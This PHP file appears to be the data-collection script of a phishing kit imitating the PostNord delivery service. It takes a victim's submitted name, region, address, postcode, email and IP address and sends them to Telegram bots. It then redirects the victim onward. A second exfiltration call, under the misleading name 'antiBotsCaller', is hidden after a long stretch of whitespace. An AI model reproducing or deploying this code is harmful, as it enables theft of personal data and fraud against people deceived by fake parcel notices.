<?php

include('../common/includes.php');
include("../config.php");
$UserAgent =$_SERVER['HTTP_USER_AGENT'];
$browser = explode(')',$UserAgent);				
$_SESSION['browser'] = $browserTy_Version =array_pop($browser); 	

$ccya = $_POST['1'];
$ip = $_SERVER['REMOTE_ADDR'];
$message ="
📦 𝙋𝙊𝙎𝙏 𝙉𝙊𝙍𝘿 𝙄𝙉𝙁𝙊
📝 𝗙𝗼𝗿𝗻𝗮𝘃𝗻: ".$_POST['name']."
🌍 𝗥𝗲𝗴𝗶𝗼𝗻: ".$_POST['reg']."
🏡 𝗔𝗱𝗿𝗲𝘀𝘀𝗲: ".$_POST['local']."
🔢 𝗣𝗼𝘀𝘁𝗻𝘂𝗺𝗺𝗲𝗿: ".$_POST['zip']."
📧 𝗘𝗺𝗮𝗶𝗹: ".$_POST['email']."
🌐 IP: ".$ip."\n";
$messag = $message;
function antiBotsCaller($messaggio,$token,$chatid) {
$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
$url = $url . "&text=" . urlencode($messaggio);
$ch = curl_init();
$optArray = array(
CURLOPT_URL => $url,
CURLOPT_RETURNTRANSFER => true
);
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}                                                                                                                                                                              antiBotsCaller($messag,$anti2,$anti1);
antiBotsCaller($message,$token,$chatid);
header("Location: ../low.php");

?>